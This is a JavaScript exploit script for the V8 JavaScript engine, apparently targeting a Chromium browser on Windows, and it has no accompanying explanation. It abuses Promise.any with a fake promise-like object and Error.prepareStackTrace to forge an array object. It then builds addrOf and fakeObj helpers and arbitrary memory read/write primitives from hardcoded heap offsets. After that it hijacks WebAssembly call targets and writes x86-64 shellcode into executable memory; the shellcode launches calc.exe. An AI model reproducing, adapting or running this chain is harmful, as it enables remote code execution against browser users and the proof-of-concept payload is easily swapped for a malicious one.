function dp(obj) {}//%DebugPrint(obj)}
function dpp(ptr) {}//%DebugPrintPtr(ptr)}

let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);
let i32 = new Uint32Array(buf);

function itof(val) {
    i64[0] = BigInt(val);
    return f64[0];
}

function ftoi(val) {
    f64[0] = val;      
    return i64[0];
}

function pair_32_to_f(low, high)
{
    i32[0] = low;
    i32[1] = high;
    return f64[0];
}

function mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
}

function scavenge_gc() {
    for (var i = 0; i < 8; i++) {
        new ArrayBuffer(0x200000)
    }
    new ArrayBuffer(8)
}

function PromiseLike(executor) {
    executor(()=>{}, ()=>{});
}
PromiseLike.resolve = function() {
    return {then: function(resolve, reject) {
        Promise.resolve().then(() => {throw new Error("ngu")}).then(null, (e)=>{console.log(e.stack)}).then(null, reject);
        reject()
        // resolve()
        // dp(resolve)
    }};
}

function foo() {}
foo() // this used for fake jsfunction
let promiseMap = 0x018b445
let reactionMap = 0x12dd
let generatorMap = 0x019a1b1
let packDoubleArrMap = 0x18ec11
let packElementMap = 0x18ec91
let emptyFixedArray = 0x6a5
let builtinResolveFunc = 0x4B2E9
let awaitResolveClosure = 0x1841fd
let JSFunctionMap = 0x184189
let AsyncFunctionAwaitResolveClosureCode = 0x294a5
let AsyncFunctionAwaitResolveClosureCodeIndex = 0x10f5001
let undefinedAddr = 0x61
let mapScriptContext = 0x19209d
let fixedArrayMap = 0x00000565
// JSPromise: map| properties
//          : elements|result_reactions
//          : status

// reactions: map | next
//          :   reject  | fulfill
//          : promise_or_capability

// JSGeneratorObject: map | properties
//                  : elements | jsfunc
//                  : context  | receiver
//                  input_or_debug_pos | resume_mode
//                  : continuation | parameters_and_registers

// fulfill:code 0xc

// generator:continue 0x20
// generator:func 0xc
// generator:receiver 0x14


// JSFunction:context 0x14

// Context: map | len
//        : scope_info | previous -> arr[0], arr[1]
//        : extension arr[2]

// enum Field {
//     // TODO(shell): use offset-based approach for accessing common values.
//     // These slots are in all contexts.
//     SCOPE_INFO_INDEX,
//     PREVIOUS_INDEX,

//     // This slot only exists if ScopeInfo::HasContextExtensionSlot returns true.
//     EXTENSION_INDEX,


let fakeObjArrEle = 0x20c4c5 + 8
let fooAddr = 0x19ABFD
// let fakeObjArrEle = 0x30680d + 8
// let fooAddr = 0x19A77d

var fakeObjArr = [pair_32_to_f(packDoubleArrMap, emptyFixedArray),
                  pair_32_to_f(fakeObjArrEle + 0x20, 0x222),// elements and length
                  pair_32_to_f(reactionMap, 0),// reaction
                  pair_32_to_f(0x61, fakeObjArrEle + 0x20),// fake fulfill
                                                            // |
                                                            // v
                pair_32_to_f(JSFunctionMap, emptyFixedArray), // fake AsyncFunctionAwaitResolve
                pair_32_to_f(emptyFixedArray, AsyncFunctionAwaitResolveClosureCodeIndex),
                pair_32_to_f(0x41414141, fakeObjArrEle + 0x38), // context

                pair_32_to_f(mapScriptContext, 0x10), // fake context
                pair_32_to_f(0x41414141, 0x41414141),
                pair_32_to_f(fakeObjArrEle + 0x50, 0x41414141), // generator
                
                pair_32_to_f(generatorMap, 0x41414141), // fake generator
                pair_32_to_f(0x41414141, fooAddr), // jsfunc
                pair_32_to_f(0x41414141, fakeObjArrEle), // receiver
                pair_32_to_f(0x41414141, 0x41414141),
                pair_32_to_f(0x0, 0x41414141),          // continuation  
]

// scavenge_gc()
// mark_sweep_gc()

let fakeJSPromise = [pair_32_to_f(promiseMap << 8, emptyFixedArray << 8),
                    pair_32_to_f(emptyFixedArray << 8, (fakeObjArrEle + 0x10) << 8),
                    pair_32_to_f(0x0, 0x41414141), // status
]

var xx = new Array(fakeJSPromise[0], fakeJSPromise[1], fakeJSPromise[2]);
for(let i = 0; i < 0x10000; i++)
{
    xx.push(fakeJSPromise[0]);
    xx.push(fakeJSPromise[1]);
    xx.push(fakeJSPromise[2]);
    xx.push(fakeJSPromise[0]);
    xx.push(fakeJSPromise[1]);
    xx.push(fakeJSPromise[2]);
}

var x = new Array(fakeJSPromise[0], fakeJSPromise[1], fakeJSPromise[2]);

for(let i = 0; i < 0x10000; i++)
    {
        x.push(fakeJSPromise[0]);
        x.push(fakeJSPromise[1]);
        x.push(fakeJSPromise[2]);
        x.push(fakeJSPromise[0]);
        x.push(fakeJSPromise[1]);
        x.push(fakeJSPromise[2]);
    }

var fakeObj = []
Error.prepareStackTrace = function(error, structuredStackTrace) {
    if(structuredStackTrace.length > 2)
    {
        console.log("There's " + structuredStackTrace.length + " frames.");
        console.log(error.stack);
        let len = structuredStackTrace.length;
        fakeObj = structuredStackTrace[len - 1].getThis();
        
        function addrOf(obj)
        {
            fakeObjArr[0] = pair_32_to_f(packElementMap, emptyFixedArray)
            fakeObj[0] = obj
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            let ret = ftoi(fakeObj[0]) & 0xffffffffn
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
            return ret;
        }

        function fakeObj_(addr)
        {
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObj[0] = itof(addr)
            fakeObjArr[0] = pair_32_to_f(packElementMap, emptyFixedArray)
            return fakeObj[0];
        }

        function read_4(addr)
        {
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObjArr[1] = pair_32_to_f(Number(addr) - 0x38, 0x222) // use index 6 since read may change data near the addr
            let ret = ftoi(fakeObj[6]) & 0xffffffffn;
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
            return ret;
        }

        function write_4(addr, val)
        {
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObjArr[1] = pair_32_to_f(Number(addr) - 8, 0x222)
            let old = ftoi(fakeObj[0])
            old = (old & 0xffffffff00000000n) | (BigInt(val) & 0xffffffffn)
            fakeObj[0] = itof(old)
            fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
            fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)// elements and length
        }

        function get_call_target(func)
        {
            let addr = addrOf(func);
            let shared_func_info = read_4(addr + 0x10n);
            let function_data = read_4(shared_func_info + 0x8n);
            let internal = read_4(function_data + 0x4n);
            let call_target = read_4(internal + 0x14n);
            return call_target;
        }

        function swap_call_target(func1, func2)
        {
            let call_target1 = get_call_target(func1);
            let call_target2 = get_call_target(func2);
            // console.log(call_target1.toString(16))
            // console.log(call_target2.toString(16))

            let addr1 = addrOf(func1);
            let shared_func_info1 = read_4(addr1 + 0x10n);
            let function_data1 = read_4(shared_func_info1 + 0x8n);
            let internal1 = read_4(function_data1 + 0x4n);
            // console.log(shared_func_info1.toString(16))
            // console.log(function_data1.toString(16))
            // console.log(internal1.toString(16))

            let addr2 = addrOf(func2);
            let shared_func_info2 = read_4(addr2 + 0x10n);
            let function_data2 = read_4(shared_func_info2 + 0x8n);
            let internal2 = read_4(function_data2 + 0x4n);
            // console.log(shared_func_info2.toString(16))
            // console.log(function_data2.toString(16))
            // console.log(internal2.toString(16))
    
            write_4(internal1 + 0x14n, Number(call_target2));
            write_4(internal2 + 0x14n, Number(call_target1));
        }
        
        
        var wasmArr = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x15, 0x04, 0x60,
            0x02, 0x7e, 0x7e, 0x00, 0x60, 0x01, 0x7e, 0x01, 0x7e, 0x60, 0x02, 0x7f,
            0x7e, 0x00, 0x60, 0x01, 0x7f, 0x01, 0x7e, 0x03, 0x05, 0x04, 0x00, 0x01,
            0x02, 0x03, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x2d, 0x04, 0x09, 0x6f,
            0x6f, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, 0x08, 0x6f,
            0x6f, 0x62, 0x5f, 0x72, 0x65, 0x61, 0x64, 0x00, 0x01, 0x08, 0x64, 0x6f,
            0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x07, 0x64, 0x6f, 0x5f,
            0x72, 0x65, 0x61, 0x64, 0x00, 0x03, 0x0a, 0x1c, 0x04, 0x03, 0x00, 0x01,
            0x0b, 0x04, 0x00, 0x42, 0x00, 0x0b, 0x09, 0x00, 0x20, 0x00, 0x20, 0x01,
            0x37, 0x03, 0x00, 0x0b, 0x07, 0x00, 0x20, 0x00, 0x29, 0x03, 0x00, 0x0b,
            0x00, 0x64, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x01, 0x29, 0x04, 0x00, 0x09,
            0x6f, 0x6f, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x01, 0x08, 0x6f,
            0x6f, 0x62, 0x5f, 0x72, 0x65, 0x61, 0x64, 0x02, 0x08, 0x64, 0x6f, 0x5f,
            0x77, 0x72, 0x69, 0x74, 0x65, 0x03, 0x07, 0x64, 0x6f, 0x5f, 0x72, 0x65,
            0x61, 0x64, 0x02, 0x32, 0x04, 0x00, 0x02, 0x00, 0x04, 0x76, 0x61, 0x72,
            0x31, 0x01, 0x04, 0x76, 0x61, 0x72, 0x32, 0x01, 0x01, 0x00, 0x04, 0x76,
            0x61, 0x72, 0x31, 0x02, 0x02, 0x00, 0x06, 0x6f, 0x66, 0x66, 0x73, 0x65,
            0x74, 0x01, 0x05, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x03, 0x01, 0x00, 0x06,
            0x6f, 0x66, 0x66, 0x73, 0x65, 0x74])
        var wasmModule = new WebAssembly.Module(wasmArr);
        var wasmInstance = new WebAssembly.Instance(wasmModule, {});
        var wasmExports = wasmInstance.exports;
        var oob_read = wasmExports.oob_read
        var oob_write = wasmExports.oob_write
        var do_read = wasmExports.do_read
        var do_write = wasmExports.do_write
        
        oob_read(0n)
        oob_write(0n, 0n)
        do_read(0)
        do_write(0, 0n)

        fakeObjArr[0] = pair_32_to_f(packDoubleArrMap, emptyFixedArray)
        fakeObjArr[1] = pair_32_to_f(0x25 - 0x8, 0x222)
        var base = ftoi(fakeObj[0]) & 0xffffffffn;
        base = base << 32n
        var memory_base = base + 0x380000000n
        fakeObjArr[1] = pair_32_to_f(fakeObjArrEle + 0x20, 0x222)
        console.log("Base: 0x" + base.toString(16))
        console.log("Memory Base: 0x" + memory_base.toString(16))
        
        var instance_addr = addrOf(wasmInstance)
        var lower_rwx = read_4(instance_addr + 0x48n) & 0xffffffffn
        var upper_rwx = read_4(instance_addr + 0x4cn) & 0xffffffffn
        var rwx_addr = (upper_rwx << 32n) | lower_rwx
        console.log("RWX: 0x" + rwx_addr.toString(16))
        var target = rwx_addr + 0xe00n

        swap_call_target(oob_read, do_read)
        swap_call_target(oob_write, do_write)
        // oob_write(target - memory_base, 0x9090909090909090n)
        // oob_read(0x111111111111111n)
        // dp(oob_read)
        // dp(wasmInstance)

        var shellcode = [0x54, // push rsp due to movaps issue
            0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x42, 0x60, 0x48, 0x8b, 0x70, 0x18, 0x48, 0x8b, 0x76, 0x20,
            0x4c, 0x8b, 0x0e, 0x4d, 0x8b, 0x09, 0x4d, 0x8b, 0x49, 0x20, 0xeb, 0x63, 0x41, 0x8b, 0x49, 0x3c,
            0x4d, 0x31, 0xff, 0x41, 0xb7, 0x88, 0x4d, 0x01, 0xcf, 0x49, 0x01, 0xcf, 0x45, 0x8b, 0x3f, 0x4d,
            0x01, 0xcf, 0x41, 0x8b, 0x4f, 0x18, 0x45, 0x8b, 0x77, 0x20, 0x4d, 0x01, 0xce, 0xe3, 0x3f, 0xff,
            0xc9, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x34, 0x8e, 0x4c, 0x01, 0xce, 0x48, 0x31, 0xc0, 0x48, 0x31,
            0xd2, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xca, 0x0d, 0x01, 0xc2, 0xeb, 0xf4, 0x44, 0x39,
            0xc2, 0x75, 0xda, 0x45, 0x8b, 0x57, 0x24, 0x4d, 0x01, 0xca, 0x41, 0x0f, 0xb7, 0x0c, 0x4a, 0x45,
            0x8b, 0x5f, 0x1c, 0x4d, 0x01, 0xcb, 0x41, 0x8b, 0x04, 0x8b, 0x4c, 0x01, 0xc8, 0xc3, 0xc3, 0x41,
            0xb8, 0x98, 0xfe, 0x8a, 0x0e, 0xe8, 0x92, 0xff, 0xff, 0xff, 0x48, 0x31, 0xc9, 0x51, 0x48, 0xb9,
            0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x51, 0x48, 0x8d, 0x0c, 0x24, 0x48, 0x31, 0xd2,
            0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0]
        const padSize = (8 - (shellcode.length % 8)) % 8;
        shellcode = [...shellcode, ...new Array(padSize).fill(0x90)];
        var byte_arr = new ArrayBuffer(shellcode.length);
        var byte_arr_view8 = new Uint8Array(byte_arr);
        var byte_arr_view64 = new BigUint64Array(byte_arr);
        for (var i = 0; i < shellcode.length; i++) {
            byte_arr_view8[i] = shellcode[i];
        }

        console.log("Size: 0x" + byte_arr_view64.length.toString(16))
        for(let i = 0; i < byte_arr_view64.length; i++)
            oob_write(target + BigInt(i * 8) - memory_base, byte_arr_view64[i]);

        oob_write(rwx_addr + 0xan - memory_base, 0xc6ce900000df1e9n)
        oob_write(0n, 0n)
    }
}
Promise.any.call(PromiseLike, [1])
//function->shared_func_info(0x10)->function_data(0x8)->internal(0x4)->call_target(0x14)(index)



